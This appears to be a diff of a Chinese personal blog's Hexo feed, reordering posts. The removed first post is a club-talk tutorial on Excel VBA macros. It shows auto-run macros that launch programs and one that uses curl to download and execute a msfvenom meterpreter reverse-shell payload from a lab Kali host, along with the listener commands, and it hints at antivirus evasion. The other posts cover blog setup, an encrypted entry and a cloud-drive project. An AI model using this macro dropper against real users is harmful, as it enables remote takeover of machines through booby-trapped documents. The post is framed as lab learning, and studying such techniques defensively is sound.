-<p>很久没有更新啦，自从12月新冠开始再加上过年和开学考试<s>再加上亿点点的划水</s>，不知不觉就过去这么久了。那么今天刚好开完了社团的分享会，也一起在这里更新一下内容，也算是作为这次分享的记录了。</p>
-<hr>
-<h1>什么是宏？</h1>
-<p>Office宏，译自英文单词Macro。宏是Office自带的一种高级脚本特性，通过VBA代码，可以在Office中去完成某项特定的任务，而不必再重复相同的动作，目的是让用户文档中的一些任务自动化。</p>
-<p>Visual Basic for Applications（VBA）是Visual Basic的一种宏语言，是微软开发出来在其桌面应用程序中执行通用的自动化(OLE)任务的编程语言。主要能用来扩展Windows的应用程序功能，特别是Microsoft Office软件，也可说是一种应用程式视觉化的Basic 脚本。</p>
-<h1>如何利用？</h1>
-<p>我们创建一个启用宏的excel表格，例如<code>值日名单.xlsm</code>。</p>
-<p>点击<code>视图</code>-<code>宏</code>-<code>查看宏</code>，在这里创建一个<code>AutoOpen</code></p>
-<p><img src="https://img.anineg.space/vba2.png" alt=""></p>
-<h2 id="1-弹出计算器">1.弹出计算器</h2>
-<p>在弹出的VBA中，修改为如下代码，点击运行，即可弹出计算器。</p>
-<p><img src="https://img.anineg.space/vba4-1.png" alt=""></p>
-<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">Sub AutoOpen()</span><br><span class="line">    LaunchCalculator</span><br><span class="line">End Sub</span><br><span class="line"></span><br><span class="line">Sub LaunchCalculator()</span><br><span class="line">    Shell "calc"</span><br><span class="line">End Sub</span><br></pre></td></tr></tbody></table></figure>
-<p>原理其实就是在shell中输入<code>calc</code>，启动计算器。</p>
-<h3 id="启动Excel时自动执行">启动Excel时自动执行</h3>
-<p>在左侧<code>ThisWorkbook</code>中添加如下代码：</p>
-<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">Private Sub Workbook_Open()</span><br><span class="line">    Call AutoOpen</span><br><span class="line">End Sub</span><br></pre></td></tr></tbody></table></figure>
-<p><img src="https://img.anineg.space/vba5.png" alt=""></p>
-<p>可以令excel在启动时自动运行<code>AutoOpen</code></p>
-<h2 id="2-浏览器全屏访问指定网页">2.浏览器全屏访问指定网页</h2>
-<p>以火狐浏览器为例：</p>
-<p>代码如下，其中</p>
-<p><code>firefoxPath</code>是指火狐浏览器的安装路径。</p>
-<p><code>websiteURL</code>是指要打开的网页。</p>
-<p><code>--kiosk</code>是指定浏览器全屏模式启动，也可以修改为<code>-url</code>以普通模式启动。</p>
-<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">Sub AutoOpen()</span><br><span class="line">    OpenWeb</span><br><span class="line">End Sub</span><br><span class="line"></span><br><span class="line">Sub OpenWeb()</span><br><span class="line">    Dim firefoxPath As String</span><br><span class="line">    Dim websiteURL As String</span><br><span class="line">    </span><br><span class="line">    firefoxPath = "C:\Program Files\Mozilla Firefox\firefox.exe"</span><br><span class="line">    websiteURL = "https://anineg.space/"</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    Call Shell(firefoxPath &amp; " --kiosk " &amp; websiteURL, vbNormalFocus)</span><br><span class="line">End Sub</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure>
-<h2 id="3-利用反弹shell控制">3.利用反弹shell控制</h2>
-<p>在KALI（IP:192.168.80.128） 中生成<code>nc.exe</code>，具体过程不再详细叙述，给出命令行如下：</p>
-<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">cd /var/www/html</span><br><span class="line"></span><br><span class="line">msfconsole   </span><br><span class="line"></span><br><span class="line">use windows/x64/meterpreter_reverse_tcp</span><br><span class="line"></span><br><span class="line">show options</span><br><span class="line"></span><br><span class="line">msfvenom -p windows/x64/meterpreter_reverse_tcp lhost=192.168.80.128 lport=4444 -f exe -o nc.exe</span><br></pre></td></tr></tbody></table></figure>
-<p>现在在<code>/var/www/html</code>路径下有<code>nc.exe</code>文件，我们需要它能够在Windows上被下载，所以我们启动web服务：</p>
-<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">systemctl start apache2.service</span><br></pre></td></tr></tbody></table></figure>
-<p>如果此时在Windows浏览器中打开：<code>http://192.168.80.128/nc.exe</code> ，文件就可以被下载了。</p>
-<p>回到Excel中，修改代码如下：</p>
-<p>原理同上，就是使用<code>curl</code>帮我们下载文件，然后在cmd中直接运行。</p>
-<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">Sub AutoOpen()</span><br><span class="line">    Downloadandopen</span><br><span class="line">End Sub</span><br><span class="line"></span><br><span class="line">Sub Downloadandopen()</span><br><span class="line">    Dim curlPath As String</span><br><span class="line">    Dim fileURL As String</span><br><span class="line">    Dim downloadedFilePath As String</span><br><span class="line">    Dim command As String</span><br><span class="line">    </span><br><span class="line">    curlPath = "C:\Windows\System32\curl.exe"</span><br><span class="line">    fileURL = "http://192.168.80.128/nc.exe"</span><br><span class="line">    downloadedFilePath = "C:\Users\Administrator\Desktop\nc.exe"</span><br><span class="line">    </span><br><span class="line">    command = curlPath &amp; " -o " &amp; downloadedFilePath &amp; " " &amp; fileURL</span><br><span class="line">    Call Shell(command, vbNormalFocus)</span><br><span class="line"></span><br><span class="line">    Call Shell(downloadedFilePath, vbNormalFocus)</span><br><span class="line">End Sub</span><br></pre></td></tr></tbody></table></figure>
-<p>与此同时，在KALI上需要开启监听：</p>
-<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">msfconsole</span><br><span class="line"></span><br><span class="line">use exploit/multi/handler</span><br><span class="line"></span><br><span class="line">set payload windows/x64/meterpreter_reverse_tcp</span><br><span class="line"></span><br><span class="line">set lhost 192.168.80.128</span><br><span class="line"></span><br><span class="line">exploit</span><br></pre></td></tr></tbody></table></figure>
-<p>这样，当Excel表格在启动时就会自动连接至攻击机，渗透完成。</p>
-<p><img src="https://img.anineg.space/vba6.png" alt=""></p>
-<p>当然，对<code>nc.exe</code>做一下免杀效果会更好，如果以后有机会我会在这里继续更新一下，</p>
-<hr>
-<p>本测试仅作学习原理探究，严禁去做违法的事情！</p>
-]]></content>
-      <categories>
-        <category>学习笔记</category>
-      </categories>
-      <tags>
-        <tag>靶机</tag>
-        <tag>渗透</tag>
-        <tag>分享会</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>个人博客入坑实录</title>
-    <url>/2022/01/12/start/</url>
-    <content><![CDATA[<h3 id="🏃‍♂️这是一个强迫症建设网站的辛酸历程"><s>🏃‍♂️这是一个强迫症建设网站的辛酸历程</s></h3>
-<h3 id="👨‍🦽这是一段令人心酸的网站建设历程">👨‍🦽这是一段令人心酸的网站建设历程</h3>
-<hr>
-<h1>✏第一天：2022.1.11</h1>
-<p>放假在家n天，闲来无事，恰巧<a href="https://cgrona.top/">风清竹喧</a>同学在建个人博客，便决心一起入坑。经过几十分钟的研究，解决了域名注册以及GitHub仓库的建设。当天晚上，临时使用了GitHub自带的主题模板：</p>
-<p><img src="https://s2.loli.net/2022/01/17/QkuBvtf36zNTUY8.png" alt="202201161728985" title="初始界面"></p>
-<p>没错…</p>
-<p>它很丑，而且自由度可玩性很低，至少不是我能接受的结果。</p>
-<p>参考文章：<a href="https://sspai.com/post/54608">GitHub Pages 搭建教程</a></p>
-<hr>
-<h1>✏第二天：2022.1.12</h1>
-<p>在经过了解相关知识后，最终决定采用Hexo + GitHub 的方式来搭建免费个人博客网站。</p>
-<p>不做详细介绍，简单叙述下：</p>
-<h3 id="GitHub-Pages-是什么？"><strong>GitHub Pages 是什么？</strong></h3>
-<p>GitHub Pages 是由 GitHub 官方提供的一种免费的静态站点托管服务，让我们可以在 GitHub 仓库里托管和发布自己的静态网站页面。</p>
-<h3 id="Hexo-是什么？"><strong>Hexo 是什么？</strong></h3>
-<p>Hexo 是一个快速、简洁且高效的静态博客框架，它基于 Node.js 运行，可以将我们撰写的 Markdown 文档解析渲染成静态的 HTML 网页。</p>
-<h3 id="Hexo-GitHub-文章发布原理"><strong>Hexo + GitHub 文章发布原理</strong></h3>
-<p>在本地撰写 Markdown 格式文章后，通过 Hexo 解析文档，渲染生成具有主题样式的 HTML 静态网页，再推送到 GitHub 上完成博文的发布。</p>
-<h3 id="优点和不足"><strong>优点和不足</strong></h3>
-<p>优点：完全免费；静态站点，轻量快速；可按需求自由定制改造；托管在 GitHub，安全省心；迁移方便……</p>
-<p>不足：发文不便，依赖于本地环境；更适合个人博客使用；GitHub 在国内访问速度有点不快。（但实际上速度还是可以接受的，除了图片，真的很慢，建议将图片放图床，后面会讲到）</p>
-<p>一切都搞定后，它大概是长这个样子的⬇⬇⬇</p>
-<p><img src="https://s2.loli.net/2022/01/17/DjrMYknOSEcyzQu.jpg" alt="202201161921239"></p>
-<p>比昨天的好看多了！但是还是没有让人那么满意…</p>
-<p>参考文章：<a href="https://zhuanlan.zhihu.com/p/60578464">使用 Hexo+GitHub 搭建个人免费博客教程（小白向）</a></p>
-<hr>
-<h1>✏第三，四天：2022.1.13-14</h1>
-<p>后来经了解，发现了原来hexo是有很多主题可以用的，在这个时候我选择了Next主题来升级我的页面。</p>
-<p>整个过程不算难，跟着教程来一步步地很快就完成了。但最大的问题出在了后期的美化上。我使用的Next是8.9.0的版本，而网上大多数教程都是7.x甚至6.x的版本。据说在7.5后Next的文件结构是做了一些改动的，有人称它为“移除了custom文件的神奇跨时代版本”，这一点我在实际操作的时候真的是感同身受…</p>
-<p>但困难总比办法多嘛，在我的不懈努力之下，我发现了一位大佬的博客，其中里面详细叙述了各种文件改动以及解决方法，最终花了大概两天的时间，我的博客终于变成了我想要的样子：</p>
-<p><img src="https://s2.loli.net/2022/01/17/n7Z1Q2cCpVgai9w.jpg" alt="202201161953425"></p>
-<p>除了应用网上的各种教程以外，还可以去好好研究研究主题配置文件，使用 hexo s 命令一边改一边看效果，往往会有意想不到的效果。因为主题的版本越高，它往往内置的插件越多，所以很多东西并不需要去 npm install 的。</p>
-<p>参考文章：</p>
-<p>​	<a href="http://theme-next.iissnan.com/getting-started.html">安装 NexT</a></p>
-<p>​	<a href="https://blog.csdn.net/Growing_potato/article/details/113926856">next主题美化</a></p>
-<p>​	<a href="https://blog.csdn.net/C_acgl/article/details/86555826">Hexo优化</a></p>
-<p>​	<a href="https://www.jianshu.com/p/f054333ac9e6">打造炫酷网站</a></p>
-<p>​	<a href="https://zhuanlan.zhihu.com/p/251383216">next8.0主题美化</a></p>
-<p>​	<a href="https://tding.top/archives/2bd6d82.html">大佬的文章</a></p>
-<p>​	<a href="https://hexo-next.readthedocs.io/zh_CN/latest/">Hexo-NexT说明书</a></p>
-]]></content>
-      <categories>
-        <category>博客</category>
-      </categories>
-      <tags>
-        <tag>hexo</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>Python网络爬虫之微信公众号（待改进）</title>
     <url>/2023/05/31/pypachong/</url>
     <content><![CDATA[<h1>前言</h1>
@@ -1295,6 +1243,58 @@ hexo clean            # 清除缓存和已生成的静态文件</p>
       <tags>
         <tag>分享会</tag>
         <tag>Python</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>个人博客入坑实录</title>
+    <url>/2022/01/12/start/</url>
+    <content><![CDATA[<h3 id="🏃‍♂️这是一个强迫症建设网站的辛酸历程"><s>🏃‍♂️这是一个强迫症建设网站的辛酸历程</s></h3>
+<h3 id="👨‍🦽这是一段令人心酸的网站建设历程">👨‍🦽这是一段令人心酸的网站建设历程</h3>
+<hr>
+<h1>✏第一天：2022.1.11</h1>
+<p>放假在家n天，闲来无事，恰巧<a href="https://cgrona.top/">风清竹喧</a>同学在建个人博客，便决心一起入坑。经过几十分钟的研究，解决了域名注册以及GitHub仓库的建设。当天晚上，临时使用了GitHub自带的主题模板：</p>
+<p><img src="https://s2.loli.net/2022/01/17/QkuBvtf36zNTUY8.png" alt="202201161728985" title="初始界面"></p>
+<p>没错…</p>
+<p>它很丑，而且自由度可玩性很低，至少不是我能接受的结果。</p>
+<p>参考文章：<a href="https://sspai.com/post/54608">GitHub Pages 搭建教程</a></p>
+<hr>
+<h1>✏第二天：2022.1.12</h1>
+<p>在经过了解相关知识后，最终决定采用Hexo + GitHub 的方式来搭建免费个人博客网站。</p>
+<p>不做详细介绍，简单叙述下：</p>
+<h3 id="GitHub-Pages-是什么？"><strong>GitHub Pages 是什么？</strong></h3>
+<p>GitHub Pages 是由 GitHub 官方提供的一种免费的静态站点托管服务，让我们可以在 GitHub 仓库里托管和发布自己的静态网站页面。</p>
+<h3 id="Hexo-是什么？"><strong>Hexo 是什么？</strong></h3>
+<p>Hexo 是一个快速、简洁且高效的静态博客框架，它基于 Node.js 运行，可以将我们撰写的 Markdown 文档解析渲染成静态的 HTML 网页。</p>
+<h3 id="Hexo-GitHub-文章发布原理"><strong>Hexo + GitHub 文章发布原理</strong></h3>
+<p>在本地撰写 Markdown 格式文章后，通过 Hexo 解析文档，渲染生成具有主题样式的 HTML 静态网页，再推送到 GitHub 上完成博文的发布。</p>
+<h3 id="优点和不足"><strong>优点和不足</strong></h3>
+<p>优点：完全免费；静态站点，轻量快速；可按需求自由定制改造；托管在 GitHub，安全省心；迁移方便……</p>
+<p>不足：发文不便，依赖于本地环境；更适合个人博客使用；GitHub 在国内访问速度有点不快。（但实际上速度还是可以接受的，除了图片，真的很慢，建议将图片放图床，后面会讲到）</p>
+<p>一切都搞定后，它大概是长这个样子的⬇⬇⬇</p>
+<p><img src="https://s2.loli.net/2022/01/17/DjrMYknOSEcyzQu.jpg" alt="202201161921239"></p>
+<p>比昨天的好看多了！但是还是没有让人那么满意…</p>
+<p>参考文章：<a href="https://zhuanlan.zhihu.com/p/60578464">使用 Hexo+GitHub 搭建个人免费博客教程（小白向）</a></p>
+<hr>
+<h1>✏第三，四天：2022.1.13-14</h1>
+<p>后来经了解，发现了原来hexo是有很多主题可以用的，在这个时候我选择了Next主题来升级我的页面。</p>
+<p>整个过程不算难，跟着教程来一步步地很快就完成了。但最大的问题出在了后期的美化上。我使用的Next是8.9.0的版本，而网上大多数教程都是7.x甚至6.x的版本。据说在7.5后Next的文件结构是做了一些改动的，有人称它为“移除了custom文件的神奇跨时代版本”，这一点我在实际操作的时候真的是感同身受…</p>
+<p>但困难总比办法多嘛，在我的不懈努力之下，我发现了一位大佬的博客，其中里面详细叙述了各种文件改动以及解决方法，最终花了大概两天的时间，我的博客终于变成了我想要的样子：</p>
+<p><img src="https://s2.loli.net/2022/01/17/n7Z1Q2cCpVgai9w.jpg" alt="202201161953425"></p>
+<p>除了应用网上的各种教程以外，还可以去好好研究研究主题配置文件，使用 hexo s 命令一边改一边看效果，往往会有意想不到的效果。因为主题的版本越高，它往往内置的插件越多，所以很多东西并不需要去 npm install 的。</p>
+<p>参考文章：</p>
+<p>​	<a href="http://theme-next.iissnan.com/getting-started.html">安装 NexT</a></p>
+<p>​	<a href="https://blog.csdn.net/Growing_potato/article/details/113926856">next主题美化</a></p>
+<p>​	<a href="https://blog.csdn.net/C_acgl/article/details/86555826">Hexo优化</a></p>
+<p>​	<a href="https://www.jianshu.com/p/f054333ac9e6">打造炫酷网站</a></p>
+<p>​	<a href="https://zhuanlan.zhihu.com/p/251383216">next8.0主题美化</a></p>
+<p>​	<a href="https://tding.top/archives/2bd6d82.html">大佬的文章</a></p>
+<p>​	<a href="https://hexo-next.readthedocs.io/zh_CN/latest/">Hexo-NexT说明书</a></p>
+]]></content>
+      <categories>
+        <category>博客</category>
+      </categories>
+      <tags>
+        <tag>hexo</tag>
       </tags>
   </entry>
   <entry>
@@ -1450,6 +1450,25 @@ hexo clean            # 清除缓存和已生成的静态文件</p>
       <tags>
         <tag>bilibili</tag>
       </tags>
+  </entry>
+  <entry>
+    <title>《我不是药神》</title>
+    <url>/2022/03/17/wobushiyaoshen/</url>
+    <content><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="抱歉, 这个密码看着不太对, 请再试试." data-whm="抱歉, 这个文章不能被校验, 不过您还是能看看解密后的内容.">
+  <script id="hbeData" type="hbeData" data-hmacdigest="666d2179323feb5ec551598dfa620f9d33b63bb1b19f3500446823dea8a9a014">79a8510ad980b24d8ff0ffe9bafb69aa31e2611f27017824642b1b97f26821030d5768d3bab397a2eef0bc9bef1e7ef61ce60a3f5f9301034e0f53e08f8216354d3f8bace8b457c054647f31aaf51152513038b6a2cff455092a768e640b714c33c96045a0b45cc48e682558aa568125d35d6434a3a51e9aed2088e1dde1c9f8f1783456b024c4b18f969688488b8e28bcd797fdd03af9079fd90a6aafb5667f8bccf824571670406f21c45ccb5cc1e47fdbd44b5d7948120df03b74e2d9c9453e3741d3ee454890670de4fdf917e8d72f32f924e799aebb3825fd0c8cc2c150740b19eb4ec53bc65fe929776e7f02622eb1c82d67baa3ed71d5bd4f4c3e067a8aedec73189c14bd616a510346983b14d83142b5759903890555356bdf4e71dd9f143a331c91587c1ef7abebca3fdcc7fb240f7ab6834375362c16e3e10163062d498f81e12b0faa815242b25ecb4df22429266042453aadae9c2a857a55ddf8a62731f6e2932bd22698916064fd08d06a841534b0866d7728247977b22bf205b5b94ad809f7249228f17d880f727967c8a0bd7062727e68f77227ffdafa2558714cb22db74c3850bd99f97c3119a065a03e56b43d56ddc82ba8d02949bd16c71599b673a3cf0e3a7e0c39c7be0184b9f895f5a4daab98ecacc17b6345c7ed805d8137abcb04c29026e95853ef609bef9b1a5169c35b027ce46de901efc555b834c439e78dd9276412cc5b02eadef701fd5db3a62c714bb502eed6645121a64a7d45b3d4164874b5d44defc352c5dc935400fb1966ce54395a4fc24138a2614514d4a94c5443ea358934abc666c829721d9ea38e891a1da25542d5deaeafe55866416a6763fa28ff600fba9a115cc8373ea8daec78cd431dbe847496276e4f4af064e96ab590fc7ba69f044e2573077d9b680ceca7a8004a5e47230f6d04cd7c07280cefbd1b4a48e7ea911909bcc59789c33cf5f9d7abf3a3bc154e354146bc80a419dfcbfccee7ed342f3b2856b465575cf8c266b85d40ef9fed7a2505abc6659643313b363824c2310e8fed8f633b5ba21342576d2be25dddf61ac2c66d52a81eb83f913a17e007d91f38f2d3c9e46c95aa795ee4bbb0f9e8c83db338c05d5c332be29fe250d6c807ab1f4be56df0bb046b92ffb469230ff66696f803085fd9c355a5243984577577220a27e84f41a5e4a81000e65e289513f914cdff9d5e2cb8ee57e71c62cffc36df1b8c0f01e1433ebf9431bea3727ad9cabc537b4ea5cbfd6faee2161f6e6f79cbc06da83fb80971d09703e617af93b01bc8333ef109eff4d198c34a22a45184c988b60ccbcb5a47e9144d1d1c2cf862f7602754eafb1218cfa6980e3de4905dbb03c5e63b7249aaebe28aefde6e51a37897eda29f1c0bef37da797ed2afa710e5d2714cc8258604908588c95b6bf8e3cc1585180fb57e58bd1808d9a5f05abc5f28af1af791018c407d8db26c32f07e60d45532d09343da936078f4e04d2515fbc63b5f1d53bff4cd6f27e81435d0a821b69e7b8914816af1c397edecaf9e3930e56e1f1e632ce517572c73ce64b70f26b63f921e0b6d69788acb054339a743df82e76fafb585f4f7966bb33a2501df5b02831c00d6f49381de41f6bc78632a055b37bb86e2f9bda1319cfc76f8cf95978a2af6cc33176588562f4d2139b16d0ed18226af8f692435ded43069cebd2b0e6654350c06f79bd4ad5520da3ce1a150e7fa0bd950cc63ada79b5a2f4f5db9c270680adf27499e1ad8cee50613b1a06e8d1b86472e11c3ad526ccc6a485722b27e1f1fa022c18e91a4b6ce0ac76da77b496dd9b016dc58a8a29f0045b524ba79b1d010c682ef061121492638b323332a2170e839c241e3206fa33d3210dc55b34ae4926dd22f70419cb4720b6545874b7846c23b60ac5279f83d7cc57dd7a7ed10e8ccb24eb7b8587efd2e3d13ab7456a0813388ecfe80a1936f5b91e3c277e60c7934fc3fe61676cfaaeb25260df3aa2c28f7fd782772212720434ff5e6ece2e6161db0a24785fe469220578561b32863b0e0c9506facf9b4c0205083a9aa382df58acdfafa71de0a84a2d58f8efa637d54e874f23963d088b4b5f59d6a07546fe030a2bc7da9e1da4d6d4fcd4d2cc315cbfe408a78dc82d0b78ae3ca25188b447aa0e8a62d3903b7feaf1421f7191d3a98f6849f8608fe24bacf734c01e949707e99caee6748f537f1d13f57535f75d5cb7a2fe8b5abf7ad210842ecee55ea7d45ed8f8ca7633d8136f93194c9247993e636766cb8e0f003a7f7fc922820acb16d7fbc7e55b776ccd30dfe05fbe1d54a6bf6e283f8556eff4945327b2a8f0afb8d99f4f35327a6fbbfd630db9e9ed20ced7cb0bf2593622e4906b7f6af5a8646037c1beaece1818a561dc16141f784bc14186ff66fce5aba30ccdcef5982cb6ae18d8f00b54aa0b4dee315c95dffae347bd296bb5b5c23b7356b24880aee37bbc9bec86eefaa8734638fb146475d222a13bb3b14b9dfd05da8026bc0e462758685fdacec1e17768cefc168b759abf909aab856e8df0f8368671dcb96401e9c30c8a8456c554a8bce3cf301769b6e5c92923da34b0d8a04f14d2eb0f5bc4372afd50586a25b9f50c1cfabf43dc83a216cb7c47cf9445abb3b30bfa2c25a586381726449e29e206c2468b6ca68cf05d88b1b881e005385cbcd8c9f6d4e8bc0ac0378b898b22004d2576ee1b50f62e2c1f35491db5cf51b8a33db23eb44d4890491222e79a92395e9494a2018a9a9dec978d8ba7fd4be5b06a2bda49ab5c63cade4bd520a22f1482b06e0b1cd213f28a24a29f102ee527a65cba5e58c550fa94701f7d2f7a370bc28ea38318fa1c40c630139e455d7d8d4293945f6703c304468ec9db040c062012c88abef9ea414e6cbc03f528587e38fd599f728878dead5ba09eb046b1043c32ab65e110007e81310c7c70023e018a02551c82776218280f053183222681cbfa52b649fdf16bccb1b0ad52a2b2466c13e5d74c757b6279456e095d15700c454ca1d80d4e53610caee23bc6a0c2e1ea0500d9b657c52da52242cbeec41c54b6326dc0a27ff9fd90890e0052af497016d6dc7db63a7faf124eb412b3e2ec8dadc22ebcecd37fd5c28eb1dbc3e6e38ba3d1c6b00d7c5f12c92934f7caba5fdf68222eaf589506112a82c7a0702b71ef42209f15d358a72cc96e0b01c5f7e3d2b5c4a642ba0cdde80d5514245873df84467a6c36ee889b821d1981dbe802823e2e6ba059de91f3f1df3546aa5aa3756e678ec41670cac78bccb7cf09206a0d937c1d2e4ccc03bf63e9141dde155606eb7241527138dbb477d0ca3f9ec7a9d17cd09def2185a4d8ef1323031c70ab269387f106bf9cf653eceaa5f3d5296db70d0901e7aa2a3d68fc612eb365c75656c00941b55d3a4d45455fac6059002f898a21c7f4b460532dda2bf8eb03e8c16f720e29f1074116a78301f9bbd2a43d274e39f6898ba10758bcbffcee3f661ca3e3c227a6c9b99ddec81437cbdb4187b79ba47495358d45e32ac793ef0953e4dd7e7174eaea19d0eb4fdc4b3c6c9ffe9ce3c1661f91e4ede119a9715f00f9f12e568fab689ab8feb561cbdf0181da05dd11fd5cea4819e6d5b6738ec24cb1d717769e6608aea0a7bc523aef9928ce6a02c03ce766f322b79d477e028e7e8b2a77f7c701f4d839ac7a8d95408461a74cdb4047288ef33148a4355c2629821241bd91c95aa8baa7ced9e6a57a3899fd0d359a2b260b0d83777b8718d0035184c61ebafaa11143675da1cd67890351d5862011c35429c4bf7927548b2f36b1efccad7ad399aac8332164b2ad901a6e9663890449eecab58d147acb6a06d676da278b3a523a951b6b85b2b3f24306dd3b6def987c78e67ecda4f33212fec193d611267749cdde871fc84d059344ecde839338706eafcbf31f640f889c283153c55c1ad7c40055a9f4943edc4a98046d5e6655d329d2969f2d5b7edeb4bacf67c64e4706dbacb3da84d18e25f0552dc268ba34bd23e96f22a1371b58f49fac0bb5770832a82ebb95c9cc762a26714ef45a1805897ea72d44b24573ac89d8cc7e602610d1edc44b0cc1e5d811bca3fba5c6b74d34107fa51fe4c5bba03fda1d7c588425fac6f927c4185b98d76b203a793de4d9168ec2e63d218f968b0e65926ac89c35204eca2801fae023794fa407550ef38d46e81ecfae990ad3adb30d658879445f88b494a4f53ac269c9775ac16340f30e4c15efc46de0fa21c217b8b8168bbb0a1b0aa7f50f0f33a516cfac03f1cb790be05002a11db7f47412ca20cee8df52d9821251441ddaef62db46d217eb37f48d4e5db7c2e1f797003a60419cb4c555e80974a4419c95c368f64d8ae8f5156337900bbd258ada5fffec1914d6aa6aa05cf9ef3248177e24f1568c14d032a5023141e84ef716c6488791b3a90def98f561fde7b9a7908f3bcc3e53bf6b436d48c73d834f48149e2b9ac4cdd24da95354f41a6eed783034e739aef8b8286c49970620d636e6d90c72ac28357a4a780002ac5e96e4abce44577b9533e40095c93cf3cdd566717124ba5a8c84ac5c08f18b8916034dcfed0db6269a74df9282dadec46d0bbe2dde8708ff20db447f04befa705d2e48eb1462d0d82b3dd68f958c15d40a17b1b9cac98d2b3767638551dec3531729edf90b22973fbb15d133d162a2760de9ae1a401563295a85b87c7f24f5ce7ccc94dcfea1b512007ff90fb7e7d6a5ffe12dbd94aa4c8b40237471f53203b5c6112f23bd41de769e514285c29156248538866eacaaa30bb86469e0e3fd56da5d86e097f6704ee54297ce6046e80ccf0323cf450cdaade7e472f6a2ee24af6f974d9b11cb088f35a50f3bab88d4ab64b8f994a9f3d70ca56d49b0024a7c6be799c1a9dfc8e71627530f52ff4d09d5707a75fa3cb1eb4d2cd4ff2a4856c4e06ba798b3f84008e03867d486f314c234bfec92463cc842b822fada1f485d56efa01d514e8806272d455c36fcd87414628473dbaf582ee9d4cd376ef759f30c885679efa1bf54c299db82f7bd860bc2e83e7227f3363a6eabe4449d31249c5fef01e0bc10e703ef20298140b5dd39a2a30d954d5a20ebaa9114af580d8cfc6fba1909db719b5bfe13f83ad0c6d20d7ef94ed755dab8e4550ff7d3237ffb707af42f11256f59890ab5ad2bf6cfa57e4979fb3db0564b13f12fc26785d96e0b138afd14d0b58123287270e6787768adbdd9938adfcb00e4d6f8b49d26d377b449fea51de5d425de1f774901522f235f3e028cc7a73a7d4d09c36524fe47945503073c5bc0477b86a46160a902b0696f4582817e01e0e70e4f622e92d90ca4a4123f9cf48dcfb91d6d2fd7afa940d35f5326d618d1ddb99620dc0bb9823e029028de0ff7d5704ce2a7085419ebb02d3793499d092b207242a1ca674ac2f3974e1d579c7c7261c6972007df6839eba1aabb12055107877912d62a7f7627002b700e154569853862aa6bd43d4f5478be4718fb8612ce90b48692ee1c29ef569ab6b08f4d81905fb8a82415a348b904087cefcab8a880141c33a4320f4653789ac38c55c05628f56eabc5f04db8e64a70488707ddbf5f6c8e0ac9f7ed9ee0b818b6e762b1b1c9b302fb651cf1ef7a64d6bf73937efbe4736372a74175f9845f5922b9e4d04c2186a5ea03dff9cb85907b8c2cc19f55a1253d18536dc779578c84fbd568d55ba9658c2ae6d5f6c590aea67f2c247f3c6a470f4395454bd69bfd8ef83a537b08286ac631e15585cdfbc4eb19809edc5651f16b09dab9556c00ad99e3a26393bb542db8786ceddca2687ae321ed721854c1ebb23567f5824b25fcab6cc4e4e48cbb23e61d4e9e29be4cc6a93dd665103553e4dd304005045635c044e8803617a88a19f14be8f7d420fbe0feea1b7f43ecd721d7b9e7779f4fc434bed7b03cd9119bfe79e06a1698d0644a5e5ae44cf3e1023f352cef7d4e5f5330429c8241d32ee22130c9ee1e3715a3e5d58f3950c9f379cef0d0d69c9837688914334ef892346a0f58b132f628c4df86507af6bec6547e810bfdcb98c98e4f211f0ceb3a6f094b33d4d644b6623b39dc06d82a2effe78d2957a43f4cdec02c145f7c3b97ec870c6dc228e86b45db46e26c2590e59d64d14d27a85be8221a87da0b4f0273952a214db0333112fd7b5242954e89f1cfbb1aff46786e87e1bd7e3d185283bd103da9e473d559784fbafc3034ec46b872e5980fe4bc19344628d89859479a000a23775cb041aade2da0f25370c70bc449629a608f2a251d1d0751c7b3be73854ff</script>
+  <div class="hbe hbe-content">
+    <div class="hbe hbe-input hbe-input-up">
+      <input class="hbe hbe-input-field hbe-input-field-up" type="password" id="hbePass">
+      <label class="hbe hbe-input-label hbe-input-label-up" for="hbePass">
+        <span class="hbe hbe-input-label-content hbe-input-label-content-up">加密文章，请输入密码</span>
+      </label>
+    </div>
+  </div>
+</div>
+<script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
+      <categories>
+        <category>随手记</category>
+      </categories>
   </entry>
   <entry>
     <title>CTF隐写术(图片隐写)</title>
@@ -1665,6 +1684,42 @@ PNG图片文件结构：</p>
       </tags>
   </entry>
   <entry>
+    <title>搭建几乎0成本的个人网盘</title>
+    <url>/2022/11/20/yunpan/</url>
+    <content><![CDATA[<h1>Onedrive-Vercel-Index</h1>
+<p>最近在网上发现了一个挺有意思的项目<a href="https://github.com/spencerwooo/onedrive-vercel-index/">onedrive-vercel-index</a>，它可以在Vercel上部署一个属于你自己的网盘。那么相比于百度网盘，你对他有着很高的控制权，<s>并不需要担心你的资源会被河蟹</s>。那么至于网速，Onedrive给的带宽不太稳定，有时可以跑到满速，有时只有3MB/s，但怎么说也比某度网盘良心多了。</p>
+<p>但这个网盘最大的缺点就在于空间上。现在注册Onedrive默认是5GB的空间，这显然不够用。但是也并非没有办法，我们在某宝上花个大概三块钱就可以把一个账号的空间永久提升至15GB。当然，如果你是购买了office365的话，那你就可以拿到1T的容量，就不需要担心什么容量的问题。网上还有一种教育版的，容量为1-5T，但是我不建议大家使用，因为这个账号的管理员可以看到你的文件，大家应该都知道数据的重要性，所以不要贪便宜使用这种。</p>
+<p>最后一个问题，Vercel给你提供默认的域名大概率由于某些原因无法访问，所以你还需要拥有一个自己的域名，并把它解析到Vercel上。购买一个域名其实并不贵，如果是新用户就会更便宜了。例如<code>.space</code> <code>.top</code> <code>.asia</code>这类，新用户只需要个位数就能拿下一年，甚至在搞活动的时候一块钱就能拿下一个<code>.cn</code>域名。一个域名可以解析到很多服务器，对于已经有域名的同学来说，这个成本直接忽略不计。</p>
